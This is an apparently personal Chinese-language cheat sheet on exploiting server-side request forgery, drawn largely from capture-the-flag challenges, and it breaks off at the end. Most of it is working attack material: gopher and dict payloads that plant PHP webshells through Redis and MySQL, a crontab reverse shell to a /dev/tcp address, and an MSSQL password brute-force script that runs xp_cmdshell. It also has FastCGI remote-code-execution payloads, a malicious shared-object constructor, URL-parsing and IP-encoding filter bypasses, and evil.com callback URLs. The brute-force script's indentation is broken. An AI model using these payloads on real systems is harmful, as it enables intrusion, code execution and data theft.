# 产生ssrf漏洞

## file_get_contents

```python
<?php
    $url = $_GET['url'];
    $homepage = file_get_contents($url);
    echo $homepage;
?>
```

payload:

```python
ssrf.php?url=../../../../../etc/passwd
```

## fsockopen()

```python
fsockopen($hostname,$port,$errno,$errstr,$timeout);
```

用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。

```python
//ssrf.php
<?php
$host=$_GET['url'];
$fp = fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)
\n";
} else {
    $out = "GET / HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?>
```

```python
ssrf.php?url=www.baidu.com
```

## curl_exec()

改函数初始化一个新的会话，返回一个cURL句柄，供curlsetopt()，curlexec()和curlclose() 函数使用。

```python
//ssrf.php
<?php
if (isset($_GET['url'])){
    $link = $_GET['url'];
    $curlobj = curl_init(); // 创建新的 cURL 资源
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项
    $result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器
    curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源
 
    // $filename = './curled/'.rand().'.txt';
    // file_put_contents($filename, $result); 
    echo $result;
}
?>
```

```python
ssrf.php?url=www.baidu.com
```

## location

参考

[https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/#Part1](https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/#Part1)

```javascript
from flask import Flask,request
from urllib.parse import quote
import requests


app = Flask(__name__)


@app.route('/\\@i.ibb.co/1.png')
def hello_world():
    return "login fail", 302, [("Content-Type", "image"), ("Location", "file:///usr/src/app/fl4gg_tetCTF")]
    # return"23333"

if __name__ == '__main__':
    app.run(host="0.0.0.0",port="1239",debug=False)
```

这里我们让环境访问这个服务，就能自己跳转到内网服务

# 协议

## file

这种URL Schema可以尝试从文件系统中获取文件：

```python
http://example.com/ssrf.php?url=file:///etc/passwd
```

一些敏感文件，通过读取这些文件来判断当前机器的网络情况，获取内网资产

```python
/etc/hosts
/proc/net/arp
/etc/network/interfaces
```

## http/https(扫描)

使用burpsuite，去爆破对应的ip

内网IP网段:

```python
C类：192.168.0.0 - 192.168.255.255
B类：172.16.0.0 - 172.31.255.255
A类：10.0.0.0 - 10.255.255.255
```

## dict

### 常见端口探测

```python
ssrf.php?url=dict://192.168.52.131:6379      // redis
ssrf.php?url=dict://192.168.52.131:80        // http
ssrf.php?url=dict://192.168.52.130:22        // ssh
```

### dict协议写shell

**redis环境下**

#### 写马

在环境中不能直接写入?,利用编码进行绕过

```python
dict://127.0.0.1:6379/set:webshell:"\x3C\x3fphp\x20phpinfo\x28\x29\x3b\x3f\x3e"
```

#### 反弹shell

```python
set 1 '\n\n*/1 * * * * root /bin/bash -i >& /dev/tcp/192.168.163.132/2333 0>&1\n\n'

转换一下即：
url=dict://127.0.0.1:6379/set:webshell:"\n\n\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20root\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/127.0.0.1/2333\x200\x3e\x261\n\n"
但还要注意这里不能够这么写：\x5c 而应该直接就 \n
```

[https://xz.aliyun.com/t/8613](https://xz.aliyun.com/t/8613)

## gopher协议

### 利用Gopher协议发送HTTP GET请求

gopher协议格式:URL: gopher://:/_后接TCP数据流

```python
import urllib.parse
payload =\
"""GET /echo.php?whoami=Bunny HTTP/1.1
Host: 192.168.91.194
"""  
# 注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://192.168.91.194:80/'+'_'+new
print(result)
```

**注意这几个问题：**

1.  问号（?）需要转码为URL编码，也就是%3f 
2.  回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a 
3.  在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束） 
4.  请求几次就要编码几次 

### 利用Gopher协议发送HTTP POST请求

```python
import urllib.parse

payload = """POST /echo.php HTTP/1.1
Host: 192.168.91.194
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

whoami=Bunny
"""
# 注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A', '%0D%0A')
result = 'gopher://192.168.91.194:80/' + '_' + new
print(result)
```

[https://blog.csdn.net/qq_51553814/article/details/119613725](https://blog.csdn.net/qq_51553814/article/details/119613725)

### 打无密码的mysql

原理：

[https://blog.csdn.net/qq_41107295/article/details/103026470](https://blog.csdn.net/qq_41107295/article/details/103026470)

使用工具gopherus.py

[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)

```python
python2 gopherus.py --exploit mysql
select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/1.php"
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364196252-a34cabca-46bb-4cca-9ddb-a8e8cf5af1c1.png#averageHue=%23303848&id=Bm5Pp&originHeight=505&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

以ctfshow web359为例子

把上面得到的再url编码一下

```python
import urllib.parse
payload =\
"""%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01"""
# 注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
print(tmp)
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364196380-62268032-741e-42ed-b310-d35df810c2da.png#averageHue=%23f7f3f3&id=S2nYk&originHeight=498&originWidth=968&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

成功写马

[https://blog.csdn.net/xiaolong22333/article/details/113727319](https://blog.csdn.net/xiaolong22333/article/details/113727319)

### 打未授权redis

```python
python2 gopherus.py --exploit redis
<?php eval($_POST['1']);?>
```

木马在shell.php

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364196482-c3066ff8-87bf-4cd3-a5c8-0388c67b6ed2.png#averageHue=%232a3141&id=Jsarz&originHeight=536&originWidth=675&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

还需要进行一次url编码

[https://blog.csdn.net/unexpectedthing/article/details/121667613](https://blog.csdn.net/unexpectedthing/article/details/121667613)

### 打msssql

```python
import struct
from pwn import *
import requests


def tds7_enc(password):
    encrypted_pass = ""
    for i in range(len(password)):
        encrypted_pass += chr((((ord(password[i]) << 4) | (ord(password[i]) >> 4)) ^ 0xA5) % 256) + "\xa5"
    return encrypted_pass


def tds_prelogin():
    prelogin_packet = "\x12\x01\x00\x2f\x00\x00\x01\x00\x00\x00\x1a\x00\x06\x01\x00\x20\x00\x01\x02\x00\x21\x00\x01\x03\x00\x22\x00\x04\x04\x00\x26\x00\x01\xff\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00"
    return prelogin_packet


def tds_login(mssql_username, mssql_password, mssql_database):
    login_packet_part1 = \
    "\x10\x01{packet_len}\x00\x00\x01\x00" + \
    "{total_packet_len}\x04\x00\x00\x74" + \
    "\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

    login_packet_part2 = \
    "{client_offset}{client_len}" + \
    "{username_offset}{username_len}" + \
    "{password_offset}{password_len}" + \
    "{app_offset}{app_len}" + \
    "{server_offset}{server_len}" + \
    "{unknown_offset}{unknown_len}" + \
    "{library_offset}{library_len}" + \
    "{locale_offset}{locale_len}" + \
    "{database_offset}{database_len}" + \
    "{client_mac}" + \
    "{packet_len}{packet_len}{packet_len}" + \
    "\x00\x00\x00\x00" + \
    "{client_name}{username}{password}{app_name}{server_name}{library_name}{database_name}"

    client_name = "n1ctf".encode("utf-16-le")
    username = mssql_username.encode("utf-16-le")
    password = tds7_enc(mssql_password)
    app_name = "n1ctf".encode("utf-16-le")
    server_name = "localhost".encode("utf-16-le")
    library_name = "n1ctf".encode("utf-16-le")
    database_name = mssql_database.encode("utf-16-le")
    client_mac = "\x00\x00\x00\x00\x00\x00"

    packet_len = 102 + len(client_name) + len(username) + len(password) + len(app_name) + len(server_name) + len(
        library_name) + len(database_name)
    total_packet_len = packet_len - 8
    packed_packet_len = struct.pack(">h", packet_len)
    packed_total_packet_len = struct.pack("<I", total_packet_len)

    client_offset = 94
    packed_client_offset = struct.pack("<h", client_offset)
    client_len = len(client_name)
    packed_client_len = struct.pack("<h", client_len / 2)

    username_offset = client_offset + client_len
    packed_username_offset = struct.pack("<h", username_offset)
    username_len = len(username)
    packed_username_len = struct.pack("<h", username_len / 2)

    password_offset = username_offset + username_len
    packed_password_offset = struct.pack("<h", password_offset)
    password_len = len(password)
    packed_password_len = struct.pack("<h", password_len / 2)

    app_offset = password_offset + password_len
    packed_app_offset = struct.pack("<h", app_offset)
    app_len = len(app_name)
    packed_app_len = struct.pack("<h", app_len / 2)

    server_offset = app_offset + app_len
    packed_server_offset = struct.pack("<h", server_offset)
    server_len = len(server_name)
    packed_server_len = struct.pack("<h", server_len / 2)

    unknown_offset = server_offset + server_len
    packed_unknown_offset = struct.pack("<h", unknown_offset)
    unknown_len = 0
    packed_unknown_len = struct.pack("<h", unknown_len / 2)

    library_offset = unknown_offset
    packed_library_offset = struct.pack("<h", library_offset)
    library_len = len(library_name)
    packed_library_len = struct.pack("<h", library_len / 2)

    locale_offset = library_offset + library_len
    packed_locale_offset = struct.pack("<h", locale_offset)
    locale_len = 0
    packed_locale_len = struct.pack("<h", locale_len / 2)

    database_offset = locale_offset
    packed_database_offset = struct.pack("<h", database_offset)
    database_len = len(database_name)
    packed_database_len = struct.pack("<h", database_len / 2)

    login_packet_part2 = login_packet_part2.format(client_name=client_name, username=username, password=password,
    app_name=app_name, server_name=server_name,
    library_name=library_name,
    database_name=database_name, client_offset=packed_client_offset,
    client_len=packed_client_len, username_offset=packed_username_offset,
    username_len=packed_username_len,
    password_offset=packed_password_offset,
    password_len=packed_password_len, app_offset=packed_app_offset,
    app_len=packed_app_len, server_offset=packed_server_offset,
    server_len=packed_server_len, unknown_offset=packed_unknown_offset,
    unknown_len=packed_unknown_len, library_offset=packed_library_offset,
    library_len=packed_library_len, locale_offset=packed_locale_offset,
    locale_len=packed_locale_len, database_offset=packed_database_offset,
    database_len=packed_database_len, client_mac=client_mac,
    packet_len=packed_total_packet_len
    )

    login_packet_part1 = login_packet_part1.format(packet_len=packed_packet_len,
    total_packet_len=packed_total_packet_len)
    login_packet = login_packet_part1 + login_packet_part2
    return login_packet


    def tds_sql_batch(sql):
    sql = sql + ";-- -"
    sql = sql.encode("utf-16-le")
    sql_len = len(sql) + 30 + 2  # gopher protocol will add \x0d\x0a at the end of the request
    sql_batch_packet = "\x01\x01{packed_sql_len}\x00\x00\x01\x00".format(packed_sql_len=struct.pack(">h", sql_len))
    sql_batch_packet += "\x16\x00\x00\x00\x12\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
    sql_batch_packet += sql
    return sql_batch_packet


    def create_packet(password, sql):
    prelogin_packet = tds_prelogin()
    login_packet = tds_login("sa", password, "master")
    query = tds_sql_batch(sql)
    packet = prelogin_packet + login_packet + query
    return urlencode(packet)

    def send(sess, sess_id, password):
    sql = "select 'this_is_test_text';"
    packet = create_packet(password, sql)
    payload = "[e-h]opher://10.11.22.9:1433/_{%s,%s}" % (sess_id, packet)
    data = {"url": payload}
    text = sess.post("http://129.226.12.144/", data=data).content

    if "this_is_test_text" in text:
    print "password: " + password
    sql = "exec master..xp_cmdshell 'cmd /c reg query \"HKEY_LOCAL_MACHINE\SOFTWARE\N1CTF2021\" /s'"
    packet = create_packet(password, sql)
    payload = "[e-h]opher://10.11.22.9:1433/_{%s,%s}" % (sess_id, packet)
    data = {"url": payload}
    text = sess.post("http://129.226.12.144/", data=data).content
    print text
    exit(0)

    if "__main__" == __name__:
    sess = requests.session()
    text = sess.get("http://129.226.12.144/").content
    reg = re.compile("</code>(.*)</br>")
    sess_id = reg.findall(text)[0]

    for password in open("./password.txt"):
    send(sess, sess_id, password.strip())
```

[https://github.com/Nu1LCTF/n1ctf-2021/tree/main/Web/funny_web](https://github.com/Nu1LCTF/n1ctf-2021/tree/main/Web/funny_web)

[[http://c1imber.top/2021/11/23/2021 n1ctf 复盘/#Funny-web](http://c1imber.top/2021/11/23/2021%20n1ctf%20%E5%A4%8D%E7%9B%98/#Funny-web)]([http://c1imber.top/2021/11/23/2021](http://c1imber.top/2021/11/23/2021) n1ctf 复盘/#Funny-web)

[https://blog.z3ratu1.cn/%E6%8B%9F%E6%80%81&L3H&%E6%B7%B1%E8%82%B2&%E6%B9%96%E6%B9%98&%E8%A5%BF%E6%B9%96&N1.html](https:_blog.z3ratu1.cn_%e6%8b%9f%e6%80%81&l3h&%e6%b7%b1%e8%82%b2&%e6%b9%96%e6%b9%98&%e8%a5%bf%e6%b9%96&n1)

## SFTP

```python
ssrf.php?url=sftp://evil.com:11111/
```

## TFTP

```python
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

## LDAP

```python
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

# 绕过

## 更改ip地址写法

例如192.168.0.1这个IP地址可以被改写成：

```python
8进制格式：0300.0250.0.1
16进制格式：0xC0.0xA8.0.1
10进制整数格式：3232235521
16进制整数格式：0xC0A80001
```

另外IP中的每一位，各个进制可以混用。

访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。

一键转换ip脚本

```python
<?php
$ip = '127.0.0.1';
$ip = explode('.',$ip);
$r = ($ip[0] << 24) | ($ip[1] << 16) | ($ip[2] << 8) | $ip[3] ;
if($r < 0) {
$r += 4294967296;
}
echo "十进制:";     // 2130706433
echo $r;
echo "八进制:";     // 0177.0.0.1
echo decoct($r);
echo "十六进制:";   // 0x7f.0.0.1
echo dechex($r);
?>
```

## 各种指向127.0.0.1的地址

```python
http://localhost/         # localhost就是代指127.0.0.1
http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
http://[::]:80/           # 在liunx下可用，window测试了下不行
http://127。0。0。1/       # 用中文句号绕过
http://①②⑦.⓪.⓪.①
http://127.1/
http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1
```

还可以用短地址

```python
奇淫巧技：将域名A类指向127.0.0.1
http(s)://sudo.cc/指向127.0.0.1

url=http://sudo.cc/flag.php

也可以
<?php header("Location: http://127.0.0.1/flag.php");
# POST: url=http://your-domain/ssrf.php
```

## 利用不存在的协议头绕过指定的协议头

file_get_contents()函数的一个特性，即当PHP的file_get_contents()函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）

```python
// ssrf.php
<?php
highlight_file(__FILE__);
if(!preg_match('/^https/is',$_GET['url'])){
die("no hack");
}
echo file_get_contents($_GET['url']);
?>
```

上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：

```python
httpsssss://
```

此时file_get_contents()函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：

```python
ssrf.php?url=httpsssss://../../../../../../etc/passwd
```

这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。

## 利用URL的解析问题

### **利用readfile和parse_url函数的解析差异绕过指定的端口**

```python
// ssrf.php
<?php
$url = 'http://'. $_GET[url];
$parsed = parse_url($url);
if( $parsed[port] == 80 ){  // 这里限制了我们传过去的url只能是80端口的
	readfile($url);
} else {
	die('Hacker!');
}
```

上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：

```python
ssrf.php?url=127.0.0.1:11211:80/flag.txt
```

![](https://cdn.nlark.com/yuque/0/2023/jpeg/25519932/1702364196592-1628137b-7bf2-4dcc-8ae5-5f63f285c3b9.jpeg#averageHue=%23232322&id=SnCCo&originHeight=388&originWidth=690&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

从上图中可以看出readfile()函数获取的端口是最后冒号前面的一部分（11211），而parse_url()函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过WAF。

这两个函数在解析host的时候也有差异，如下图：

![](https://cdn.nlark.com/yuque/0/2023/jpeg/25519932/1702364196712-a5b3b798-ddcd-43ce-9533-5ad696c40bfa.jpeg#averageHue=%23232322&id=BEtgy&originHeight=388&originWidth=690&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

readfile()函数获取的是@号后面一部分（evil.com），而parse_url()函数获取的则是@号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中parse_url()函数对指定host的限制。

### **利用curl和parse_url的解析差异绕指定的host**

原理如下：

![](https://cdn.nlark.com/yuque/0/2023/jpeg/25519932/1702364196825-207f384d-f339-4e80-b6a6-614d04e3220e.jpeg#averageHue=%23242423&id=K0HlK&originHeight=388&originWidth=690&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

从上图中可以看到curl()函数解析的是第一个@后面的网址，而parse_url()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parse_url()函数对指定host的限制。

测试代码

```python
<?php
highlight_file(__FILE__);
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;// 检查是否是内网ip
}
function safe_request_url($url)
{
    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }
}
$url = $_GET['url'];
if(!empty($url)){
    safe_request_url($url);
}
?>
```

上述代码中可以看到check_inner_ip函数通过url_parse()函数检测是否为内网IP，如果不是内网 IP ，则通过curl()请求 url 并返回结果，我们可以利用curl和parse_url解析的差异不同来绕过这里的限制，让parse_url()处理外部网站网址，最后curl()请求内网网址。paylaod如下：

```python
ssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php
```

## curl

```python
/l|g|[\x01-\x1f]|[\x7f-\xff]|['\"]/i
```

过滤l的时候，可以用利用下面trick绕过

```python
curl fi{k,l,m}e:///etc/passwd
curl fi[k-m]e:///etc/passwd
```

# FAST-CGI攻击

参考

[https://cloud.tencent.com/developer/article/1838766](https://cloud.tencent.com/developer/article/1838766)

## 利用 fcgi_exp.go 攻击

•项目地址：[https://github.com/wofeiwo/webcgi-exploits](https://github.com/wofeiwo/webcgi-exploits)

将该项目下载下来后，进入到 webcgi-exploits/php/Fastcgi，新建一个 fcgiclient 目录，将 fcgiclient.go 放入新建的 fcgiclient 目录中：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364196942-6798ff9f-9367-4d10-82c5-f3404f8c7a11.png#averageHue=%230e2c19&id=gNkiA&originHeight=410&originWidth=950&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

然后安装 go 环境进行编译：

```php
go build fcgi_exp.go                    # 编译fcgi_exp.go
```

然后直接运行可以看到 fcgi_exp 的使用方法：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364197278-4a5c654c-48a9-4936-b97e-5b77bc5417f3.png#averageHue=%23050d11&id=ePlWs&originHeight=573&originWidth=982&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
使用如下命令进行测试

```
./fcgi_exp system 192.168.43.82 9000 /var/www/html/index.php "id"
```

•system：要使用的PHP函数•192.168.43.82：目标机IP•9000：目标机 fpm 端口•/var/www/html/index.php：已知的位于目标机上的PHP文件•id：要执行的系统命令

如下图所示，成功执行系统命令，利用成功：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364197510-74b4384a-e762-40b1-99ea-ea212be97e14.png#averageHue=%2305090f&id=IwD2N&originHeight=722&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 利用 phith0n 大神的 fpm.py

利用方式：

```
python fpm.py 192.168.43.82 /var/www/html/index.php -c "<?php system('id'); exit(); ?>"
```

如下图所示，成功执行系统命令，利用成功：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364197687-9f09bde7-ae6d-4379-8aa8-2335224a88a2.png#averageHue=%2304080e&id=M6l1C&originHeight=705&originWidth=834&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## **SSRF 中对 FPM/FastCGI 的攻击**

### **利用 fcgi_exp 攻击**

•项目地址：[https://github.com/wofeiwo/webcgi-exploits](https://github.com/wofeiwo/webcgi-exploits)

刚在我们已经演示过了，fcgi_exp 这个工具主要是用来攻击未授权访问 php-fpm 的，所以一些地方需要自己写脚本转换一下 payload。

在攻击机上使用 nc -lvvp 1234 > fcg_exp.txt 监听1234 端口来接收 payload，另外开启一个终端使用下面的命令发送 payload

```shell
./fcgi_exp system 127.0.0.1 1234 /var/www/html/index.php "id"
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364197844-74c10c35-f542-4d66-a5f3-ce92a93b6441.png#averageHue=%2307090e&id=RcNXu&originHeight=331&originWidth=1162&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
注意这里攻击的端口是上面监听的端口，目的是将payload发送到这个端口，运行后可以使用Ctrl+C 来结束运行，现在就得到了一个fcg_exp.txt的文件，里面是获得的payload，可以使用 xxd fcg_exp.txt 查看其内容：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364198041-3f6c14f8-dc4d-4baa-8b60-a2bf60416293.png#averageHue=%23040a0e&id=PMKhZ&originHeight=606&originWidth=847&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
文件里的内容有部分是不可见字符，这里需要url编码一下，这里写一个Python脚本对文件中的内容进行编码

```python
from urllib.parse import quote, unquote, urlencodefile = open('fcg_exp.txt','r')payload = file.read()print("gopher://127.0.0.1:9000/_"+quote(payload).replace("%0A","%0D").replace("%2F","/"))
```

执行上面的python脚本生成如下payload：

```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%14%04%00%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Ddisable_functions%20%3D%20%0Dsafe_mode%20%3D%20Off%0Dauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%008%00%00%3C%3Fphp%20system%28%27id%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0D%27%29%3B%3F%3E
```

之后我们还要对上面的payload进行二次url编码，然后将最终的payload内容放到?url=后面发送过去（这里需要进行两次编码，因为这里GET会进行一次解码，curl也会再进行一次解码）：

```
ssrf.php?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509%255BPHP_VALUEallow_url_include%2520%253D%2520On%250Ddisable_functions%2520%253D%2520%250Dsafe_mode%2520%253D%2520Off%250Dauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E
```

如下图所示，命令执行成功：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364198238-08f289ec-e553-4b1c-bc47-08b473ee9b7e.png#averageHue=%23bfbdbd&id=etZ0I&originHeight=552&originWidth=1126&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### **利用 Gopherus 攻击**

•项目地址：[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)

Gopherus 这个工具相比上一个更加方便一下，该工具能生成Gopher有效负载，用来利用SSRF进行RCE：

下面我们就利用这个工具来执行命令：

```python
python gopherus.py --exploit fastcgi
/var/www/html/index.php                 #这里输入的是一个已知存在的php文件
whoami
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364198353-d208f34a-956d-4e73-befd-ac111e8e4bdb.png#averageHue=%232a3242&id=KmcUp&originHeight=464&originWidth=664&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

获得payload，记得二次编码

## fast-cgi加载恶意so文件RCE绕过 Disable_Dunctions

参考例题总结篇[2021 蓝帽杯]one_Pointer_php

[https://err0r.top/article/bluehat2021/](https://err0r.top/article/bluehat2021/)

先写一个恶意的so文件

```cpp
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("ls / >/var/www/html/a");
}
```

编译下

```cpp
gcc hpdoger.c -fPIC -shared -o hpdoger.so
```

伪造FastCGI请求PHP-CGI

同样写在html目录

用户访问http://127.0.0.1/index.php?a=1&b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：

```cpp
{
‘GATEWAY_INTERFACE’: ‘FastCGI/1.0’,
‘REQUEST_METHOD’: ‘GET’,
‘SCRIPT_FILENAME’: ‘/var/www/html/index.php’,
‘SCRIPT_NAME’: ‘/index.php’,
‘QUERY_STRING’: ‘?a=1&b=2’,
‘REQUEST_URI’: ‘/index.php?a=1&b=2’,
‘DOCUMENT_ROOT’: ‘/var/www/html’,
‘SERVER_SOFTWARE’: ‘php/fcgiclient’,
‘REMOTE_ADDR’: ‘127.0.0.1’,
‘REMOTE_PORT’: ‘12345’,
‘SERVER_ADDR’: ‘127.0.0.1’,
‘SERVER_PORT’: ‘80’,
‘SERVER_NAME’: “localhost”,
‘SERVER_PROTOCOL’: ‘HTTP/1.1’
}
```

通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：$php_value = "open_basedir = /";

因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir

```php
<?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
